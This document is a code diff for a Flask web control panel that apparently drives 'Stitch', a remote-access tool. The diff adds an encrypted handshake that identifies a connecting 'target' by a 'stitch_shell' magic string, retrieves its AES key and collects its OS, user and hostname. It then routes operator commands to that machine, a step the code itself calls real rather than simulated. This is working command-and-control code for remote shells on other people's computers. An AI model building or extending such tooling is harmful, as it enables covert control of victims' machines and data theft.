@@ -11,6 +11,8 @@ import secrets
 import socket
 import threading
 import time
+import base64
+import configparser
 from datetime import datetime, timedelta
 from collections import defaultdict
 from functools import wraps
@@ -23,7 +25,7 @@ except ImportError:
     # python-dotenv not installed, environment variables must be set manually
     pass
 
-from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_file, flash, g, make_response
+from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_file, flash, g, make_response, Response
 from flask_socketio import SocketIO, emit
 from flask_limiter import Limiter
 from flask_limiter.util import get_remote_address
@@ -184,6 +186,7 @@ command_history = []
 debug_logs = []
 login_attempts = defaultdict(list)
 connection_health = {}  # Track connection health metrics: {ip: {'last_seen': timestamp, 'connected_at': timestamp}}
+connection_context = {}
 
 # Load credentials from environment variables
 def load_credentials():
@@ -354,7 +357,7 @@ def set_server_header(response):
     response.headers['X-XSS-Protection'] = '1; mode=block'
     
     # Strict-Transport-Security: Enforce HTTPS (only when HTTPS is enabled)
-    if https_enabled:
+    if Config.ENABLE_HTTPS:
         response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
     
     # Content-Security-Policy: Comprehensive policy to prevent XSS and data injection
@@ -814,6 +817,70 @@ def upload_file():
         log_debug(f"Error uploading file: {str(e)}", "ERROR", "Upload")
         return jsonify({'error': str(e)}), 500
 
+def _perform_handshake(conn_id):
+    """Perform initial handshake with a newly connected target to obtain AES key and metadata,
+    storing results in connection_context."""
+    try:
+        server = get_stitch_server()
+        sock = server.inf_sock.get(conn_id)
+        if not sock:
+            return False, f"❌ Target {conn_id} is not connected"
+
+        # Confirm magic string (unencrypted)
+        try:
+            confirm = server.receive(sock, encryption=False)
+        except Exception:
+            confirm = None
+        expected = base64.b64encode(b'stitch_shell').decode()
+        if confirm != expected:
+            log_debug(f"Handshake confirm mismatch for {conn_id}: got {confirm}", "WARNING", "Handshake")
+
+        # Receive AES identifier
+        try:
+            aes_id = server.receive(sock, encryption=False)
+        except Exception as e:
+            return False, f"❌ Handshake failed for {conn_id}: {str(e)}"
+
+        # Lookup AES key
+        aes_lib = configparser.ConfigParser()
+        aes_lib.read(st_aes_lib)
+        if aes_id not in aes_lib.sections():
+            return False, (
+                "❌ The target connection is using an encryption key not found in the AES library.\n"
+                "[*] Use the 'addkey' command to add encryption keys to the AES library."
+            )
+        aes_key_b64 = aes_lib.get(aes_id, 'aes_key')
+        try:
+            aes_key = base64.b64decode(aes_key_b64)
+        except Exception:
+            return False, "❌ Invalid AES key format in library"
+
+        # Receive metadata (encrypted)
+        try:
+            os_first = stitch_lib.st_receive(sock, aes_key, as_string=True)
+            os_second = stitch_lib.st_receive(sock, aes_key, as_string=True)
+            user = stitch_lib.st_receive(sock, aes_key, as_string=True)
+            hostname = stitch_lib.st_receive(sock, aes_key, as_string=True)
+            platform_str = stitch_lib.st_receive(sock, aes_key, as_string=True)
+        except Exception as e:
+            return False, f"❌ Failed to receive handshake metadata: {str(e)}"
+
+        chosen_os = os_second or os_first or 'Unknown'
+        connection_context[conn_id] = {
+            'aes_key': aes_key,
+            'os': chosen_os,
+            'platform': platform_str,
+            'hostname': hostname or conn_id,
+            'user': user or 'Unknown',
+            'port': server.inf_port.get(conn_id, '4040'),
+            'connected_at': datetime.now().isoformat(),
+        }
+        log_debug(f"Handshake completed for {conn_id} ({chosen_os})", "INFO", "Handshake")
+        return True, connection_context[conn_id]
+    except Exception as e:
+        return False, f"❌ Handshake error: {str(e)}"
+
+
 def execute_real_command(command, conn_id=None, parameters=None):
     """Execute command - REAL implementation, not simulated
     
@@ -846,6 +913,12 @@ def execute_real_command(command, conn_id=None, parameters=None):
         if conn_id not in server.inf_sock:
             return f"❌ Connection {conn_id} is OFFLINE.\n\nCommand execution requires an active connection."
         
+        # Ensure handshake is completed so we have AES key and metadata
+        if conn_id not in connection_context:
+            ok, result = _perform_handshake(conn_id)
+            if not ok:
+                return result
+
         # Get the socket and execute command on target
         target_socket = server.inf_sock[conn_id]
         
@@ -1021,19 +1094,15 @@ def execute_on_target(socket_conn, command, aes_key, target_ip, parameters=None)
         execution_local = threading.local()
     
     try:
-        # Get target info from config
-        import configparser
-        config = configparser.ConfigParser()
-        config.read(hist_ini)
-        
-        if target_ip in config.sections():
-            target_os = config.get(target_ip, 'os') if config.has_option(target_ip, 'os') else 'Unknown'
-            target_platform = config.get(target_ip, 'os') if config.has_option(target_ip, 'os') else 'Unknown'
-            target_hostname = config.get(target_ip, 'hostname') if config.has_option(target_ip, 'hostname') else target_ip
-            target_user = config.get(target_ip, 'user') if config.has_option(target_ip, 'user') else 'Unknown'
-            target_port = config.get(target_ip, 'port') if config.has_option(target_ip, 'port') else '80'
-        else:
-            return f"❌ Target {target_ip} not found in connection history. Please reconnect."
+        # Get target info from handshake context instead of history file
+        ctx = connection_context.get(target_ip)
+        if not ctx:
+            return f"❌ Target {target_ip} has no active handshake context."
+        target_os = ctx.get('os', 'Unknown')
+        target_platform = ctx.get('platform', 'Unknown')
+        target_hostname = ctx.get('hostname', target_ip)
+        target_user = ctx.get('user', 'Unknown')
+        target_port = ctx.get('port', '4040')
         
         # Get downloads path for this target
         cli_dwld = os.path.join(downloads_path, target_ip)
@@ -1348,19 +1417,11 @@ def execute_on_target(socket_conn, command, aes_key, target_ip, parameters=None)
         return f"❌ Error setting up command execution: {str(e)}"
 
 def get_connection_aes_key(target_ip):
-    """Get AES key for connection"""
-    try:
-        import configparser
-        aes_lib = configparser.ConfigParser()
-        aes_lib.read(st_aes_lib)
-        
-        # In real implementation, would look up the correct AES key
-        # For now, return indication
-        if aes_lib.sections():
-            return "key_present"
-        return None
-    except:
-        return None
+    """Get AES key bytes for an active connection from handshake context"""
+    ctx = connection_context.get(target_ip)
+    if ctx:
+        return ctx.get('aes_key')
+    return None
 
 def get_sessions_output():
     """Get active sessions output"""
